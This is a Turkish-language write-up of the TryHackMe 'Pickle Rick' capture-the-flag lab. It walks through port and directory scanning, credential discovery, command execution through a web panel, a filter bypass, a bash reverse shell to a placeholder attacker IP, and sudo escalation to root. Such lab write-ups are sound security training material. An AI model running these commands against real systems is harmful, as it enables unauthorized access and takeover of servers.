# TryHackMe - Pickle Rick

**Zorluk:** Easy
**Tema:** Rick and Morty CTF - Rick'i tekrar insana çevirmek için 3 malzemeyi bul!

## 1. Recon

Nmap ile port taraması yapıldı:

```bash
nmap -sV -sV -T5 10.112.164.127
```

**Sonuç:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

22 (SSH) ve 80 (HTTP) portları açık. Web sayfası incelendiğinde HTML comment içinde bir kullanıcı adı bulundu:

```
Note to self, remember username!
Username: R1ckRul3s
```

## 2. Directory Fuzzing & Login

`ffuf` ile dizin/dosya taraması yapıldı:

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.112.164.127/FUZZ -fc 404 -e .php,.html,.txt,.bak -t 100
```

**Bulunan dosyalar:**

```
assets                  [Status: 301]
denied.php              [Status: 302]
index.html              [Status: 200]
login.php               [Status: 200]
portal.php              [Status: 302]
robots.txt              [Status: 200]
```

`robots.txt` içeriği kontrol edildi:

```
Wubbalubbadubdub
```

Bu değer parola olarak, daha önce bulunan `R1ckRul3s` kullanıcı adıyla birlikte `login.php` üzerinden denendi ve **giriş başarılı oldu.**

## 3. Command Panel & RCE

Giriş sonrası yönlendirilen `portal.php` sayfasında bir **Command Panel** bulundu. Bu panel girilen komutları doğrudan sunucuda çalıştırıyordu (RCE).

Sayfada ayrıca bir HTML comment içinde Base64 ile encode edilmiş bir metin bulundu. Decode edildiğinde çıktı:

```
rabbit hole
```

Bu bir **rabbit hole** (yanıltıcı ipucu) olarak işaretlendi ve gerçek yol olan Command Panel üzerinden devam edildi.

### Filtre Bypass

`cat` komutu sunucu tarafında filtrelenmişti. Alternatif olarak `less` komutu kullanılarak bypass yapıldı.

```bash
whoami
```

```
www-data
```

```bash
id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4. İlk Malzeme (1st Ingredient)

Mevcut dizin listelendi:

```bash
ls -la
```

```
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

`cat` komutu filtrelendiği için `less` ile ilk malzeme dosyası okundu:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

**1. Malzeme bulundu.** ✅ *(çıktıyı buraya ekle)*

`clue.txt` dosyası da okundu:

```bash
less clue.txt
```

```
Look around the file system for the other ingredient.
```

## 5. Privilege Escalation (sudo -l)

Yetki kontrolü yapıldı:

```bash
sudo -l
```

**Sonuç:**

```
Matching Defaults entries for www-data on ip-10-112-164-127:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-112-164-127:
    (ALL) NOPASSWD: ALL
```

`www-data` kullanıcısının **şifresiz olarak root yetkisiyle her komutu çalıştırabildiği** tespit edildi.

## 6. Reverse Shell ile Stabil Bağlantı

Command Panel üzerinden tek tek komut çalıştırmak yerine, kalıcı bir shell almak için reverse shell bağlantısı kuruldu.

**Attacker makinede dinleyici açıldı:**

```bash
rlwrap nc -lvnp 4444
```

**Command Panel üzerinden çalıştırılan payload:**

```bash
bash -c 'bash -i >& /dev/tcp/SENIN_IP/4444 0>&1'
```

**Bağlantı geldi:**

```
listening on [any] 4444 ...
connect to [192.168.143.152] from (UNKNOWN) [10.112.164.127] 51896
bash: cannot set terminal process group (1023): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-112-164-127:/var/www/html$
```

## 7. Root'a Geçiş

```bash
sudo /bin/bash
whoami
```

```
root
```

```bash
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

## 8. İkinci ve Üçüncü Malzemeler

Sistemde "ingredient" kelimesi geçen dosyalar arandı:

```bash
find / -iname "*ingredient*" 2>/dev/null
```

```
/home/rick/second ingredients
```

Dosya okundu:

```bash
cat "/home/rick/second ingredients"
```

```
1 jerry tear
```

**2. Malzeme bulundu.** ✅

`/root/` dizini kontrol edildi:

```bash
cd /root
ls
```

```
3rd.txt
snap
```

```bash
cat 3rd.txt
```

```
3rd ingredients: fleeb juice
```

**3. Malzeme bulundu.** ✅

## Sonuç

Root yetkisi elde edildi ve Rick'in pickle formülü için gereken üç malzemenin tamamı bulundu:

1. `mr. meeseek hair` 
2. `1 jerry tear`
3. `fleeb juice`

**Oda başarıyla tamamlandı.** 🥒
